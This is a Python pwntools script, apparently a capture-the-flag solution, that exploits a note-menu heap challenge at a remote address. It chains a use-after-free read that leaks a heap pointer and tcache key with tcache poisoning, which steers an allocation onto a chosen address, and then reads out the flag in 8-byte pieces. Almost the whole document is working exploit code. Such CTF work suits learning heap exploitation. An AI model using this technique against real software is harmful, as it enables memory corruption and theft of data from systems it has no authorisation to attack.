from pwn import *

def add_note(r, idx, size):
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Length: ", str(size).encode())

def delete_note(r, idx):
    r.sendlineafter(b"choice: ", b"4")
    r.sendlineafter(b"Index: ", str(idx).encode())

def read_note(r, idx):
    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.recvline()
    return r.recv()

def write_note(r, idx, data):
    r.sendlineafter(b"choice: ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendafter(b"Content: ", data)

def sol(off):
    r = remote("10.113.184.121", 10058)

    # r = process("./chal")
    # attach(
    #     r,
    #     """
    #     b main
    #     continue
    #     """,
    # )
    #log.debug("Add note 1")
    add_note(r, 1, 0x30)
    #log.debug("Add note 2")
    add_note(r, 2, 0x30)
    #log.debug("Delete note 1")
    delete_note(r, 1)
    #log.debug("Delete note 2")
    delete_note(r, 2)
    #log.debug("Read note 2")
    ret = read_note(r, 2)
    heap_addr = u64(ret[:8])
    #log.info("Heap addr: %#x", heap_addr)
    key = u64(ret[8:16])
    #log.info("Key: %#x", key)
    write_note(r, 2, p64(heap_addr - off) + p64(0))
    add_note(r, 3, 0x30)
    add_note(r, 4, 0x30)
    flag = read_note(r, 4)
    r.close()
    return flag[:8]

if __name__ == "__main__":
    flag = b""
    for i in range(8):
        flag += sol(i * 8)
    print(flag)